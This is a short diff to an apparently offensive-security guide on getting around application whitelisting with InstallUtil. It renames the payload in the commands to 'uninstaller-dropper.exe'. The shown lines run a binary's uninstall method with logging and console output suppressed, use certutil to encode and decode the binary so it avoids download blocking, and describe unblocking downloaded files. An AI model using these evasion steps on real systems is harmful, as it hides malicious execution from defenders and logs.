@@ -309,14 +309,14 @@ And add `System.Management.Automation.dll`.
 Once compiled we must invoke it through installutil with `/logfile=` to avoid logging to a file, `/LogToConsole=false` to suppress output and `/U` to trigger the uninstall method:
 
 ```
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\uninstaller-dropper.exe
 ```
 
 > **Note**: An error such as `(Exception from HRESULT: 0x80131515).` can occur if you download the `.exe` from internet. Try to send it encoded and uncoded in localhost. Or also can be unblocked doing rightclick on the windows exporer -> Properties -> Unblock.
 
 ```sh
-certutil -encode bypass.exe enc.txt
-certurtil -decode enc.txt bypass.exe
+certutil -encode uninstaller-dropper.exe enc.txt
+certurtil -decode enc.txt uninstaller-dropper.exe
 ```
 
 ## Bypass with DLLs
